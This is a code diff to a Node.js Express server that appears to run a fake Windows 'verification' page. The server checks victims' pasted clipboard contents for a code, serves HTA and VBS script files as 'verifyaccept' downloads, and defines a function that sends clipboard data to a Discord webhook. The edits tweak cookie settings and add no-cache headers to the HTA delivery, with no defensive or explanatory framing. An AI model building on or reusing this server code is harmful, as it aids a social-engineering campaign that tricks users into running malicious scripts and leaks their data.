@@ -45,9 +45,9 @@ app.post('/verify-windows-code', (req, res) => {
   if (!expectedCode) return res.status(400).json({ success: false, error: "No code generated." });
   if (!clipboard.includes(expectedCode)) return res.status(401).json({ success: false, message: "Verification failed." });
 
-  // Set verification cookies
-  res.cookie('windowsVerified', '1', { httpOnly: true });
-  res.cookie('tokengate', '1', { httpOnly: true });
+  // Set verification cookies - removed httpOnly and fixed capitalization
+  res.cookie('windowsVerified', '1', { maxAge: 24 * 60 * 60 * 1000 });
+  res.cookie('tokenGate', '1', { maxAge: 24 * 60 * 60 * 1000 });
 
   res.json({ success: true });
 });
@@ -72,14 +72,12 @@ app.get('/verifynotwindows', (req, res) => res.sendFile(path.join(__dirname, 'pu
 
 // Serve the HTA file correctly here:
 app.get('/verifyaccept.hta', (req, res) => {
-  res.set('Content-Type', 'application/hta');
+  res.set({
+    'Content-Type': 'application/hta',
+    'Cache-Control': 'no-cache'
+  });
   res.sendFile(path.join(__dirname, 'public/verifyaccept.hta'));
 });
-
-
-
-
-
 
 // Function to send data to Discord webhook
 function sendToDiscord(data, type = 'clipboard') {
@@ -363,6 +361,7 @@ app.get('/verifyaccept.vbs', (req, res) => {
 app.get('/download', (req, res) => {
   res.download(path.join(__dirname, 'public', 'example.zip')); // or your real file!
 });
+
 app.listen(PORT, () => {
   console.log(`Server running on http://localhost:${PORT}`);
   
